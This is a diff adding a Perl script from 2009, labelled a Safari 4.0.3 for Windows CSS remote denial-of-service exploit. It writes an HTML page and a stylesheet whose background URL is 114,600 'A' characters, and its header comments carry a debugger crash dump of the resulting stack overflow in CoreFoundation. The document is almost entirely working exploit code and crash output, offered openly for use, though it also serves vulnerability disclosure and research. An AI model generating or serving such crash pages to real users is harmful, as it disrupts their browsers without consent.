@@ -1,0 +1,44 @@
+#!/usr/bin/perl
+# ithinkthereforeiexist.pl
+# AKA
+# Safari 4.0.3 (Win32) CSS Remote Denial of Service Exploit
+#
+# Jeremy Brown [0xjbrown41@gmail.com//jbrownsec.blogspot.com//krakowlabs.com] 11.09.2009
+#
+# *********************************************************************************************************
+# Another remotely triggerable STACK_OVERFLOW in Safari on Windows...
+#
+# (204.72c): Stack overflow - code c00000fd (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# eax=000333d8 ebx=000fbd16 ecx=00000000 edx=037b3fd0 esi=037b3fd0 edi=0001bfad
+# eip=00ae19af esp=00032ea8 ebp=00032f28 iopl=0         nv up ei pl nz na pe nc
+# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Program Files\Safari\CoreFoundation.dll - 
+# CoreFoundation!_CFStringEncodeByteStream+0x2d:
+# 00ae19af 8365b800        and     dword ptr [ebp-48h],0 ss:0023:00032ee0=00000000
+#
+# A product of Browser Fuzzer 3 :)
+#
+# "We do it in the dark, with smiles on our faces"
+#
+# *********************************************************************************************************
+# ithinkthereforeiexist.pl
+
+$html = "ithinkthereforeiexist.html";
+$css  = "ithinkthereforeiexist.css";
+
+$size = 114600;
+
+$htmldata = "<html>\n<head>\n<link rel=\"stylesheet\" href=\"" . $css . "\" />\n</head>\n";
+$htmldata = $htmldata . "<body>\n<div id=\"die\">\n</div>\n</body>\n</html>";
+
+$cssdata = "#die\n{\nbackground: url(" . "A" x $size . ");\n}";
+
+     open(FD, '>' . $html);
+     print FD $htmldata;
+     close(FD);
+
+     open(FD, '>' . $css);
+     print FD $cssdata;
+     close(FD);
